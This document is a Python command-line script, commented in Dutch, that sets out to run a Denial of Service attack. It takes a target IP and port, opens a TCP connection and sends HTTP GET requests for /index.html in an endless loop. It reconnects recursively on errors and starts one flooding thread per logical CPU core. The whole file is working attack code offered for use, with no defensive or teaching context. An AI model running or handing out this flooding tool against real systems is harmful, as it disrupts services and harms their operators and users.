import argparse

def get_max_cores():
    import psutil
    max_thread_count = psutil.cpu_count(logical=True)
    return max_thread_count


# Functie die een Denial of Service (DoS) aanval uitvoert met HTTP GET-verzoeken
def http_dos(target_host,target_port):
    import socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Een TCP-socket maken
    sock.connect((target_host, target_port))  # Verbinding maken met het doel-IP en de poort
    while True:
        try:
            import time
            print(time.time())
            time.sleep(0.001)
            sock.send(f"GET /index.html HTTP/1.1\r\nHost: {target_host}:{target_port}\r\n\r\n".encode())
        except Exception as e:
            http_dos(target_host,target_port)
            pass

# Functie om de DoS-functie uit te voeren met meerdere threads
def execute_http_dos(target_host,target_port):
    import threading
    max_thread_count = get_max_cores()  # Het maximale aantal beschikbare CPU-cores verkrijgen
    for i in range(0, max_thread_count):
        try:
            thread = threading.Thread(target=http_dos, args=(target_host,target_port))  # Een nieuwe thread maken voor elke aanval
            thread.start()  # De thread starten
            print(f"Thread {i} started (http)")  # Afdrukken dat de thread is gestart
        except Exception as e:
            print(f"Error: {e}")


def main():
    parser = argparse.ArgumentParser(description="Voer een DoS-aanval uit op een doelwit.")
    parser.add_argument("target_host", help="Het IP-adres van het doelwit")
    parser.add_argument("target_port", type=int, help="De poort van het doelwit")

    args = parser.parse_args()

    target_host = args.target_host
    target_port = args.target_port
    execute_http_dos(target_host, target_port)

if __name__ == "__main__":
    main()
